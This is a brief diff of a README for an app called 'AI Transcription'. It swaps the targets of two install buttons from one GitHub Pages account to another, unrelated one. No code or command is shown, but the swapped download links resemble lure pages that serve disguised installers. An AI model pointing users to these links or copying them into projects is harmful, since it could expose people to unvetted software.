@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/AITranscription)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://pasito2-pod.github.io/.github/AITranscription)
 
 </div>
 
@@ -81,7 +81,7 @@ AI Transcription's local processing architecture addresses a genuine privacy gap
 
 <p align="center">
 
-[![Get it Now AI Transcription](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/AITranscription)
+[![Get it Now AI Transcription](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://pasito2-pod.github.io/.github/aITranscription)
 
 </p>
 
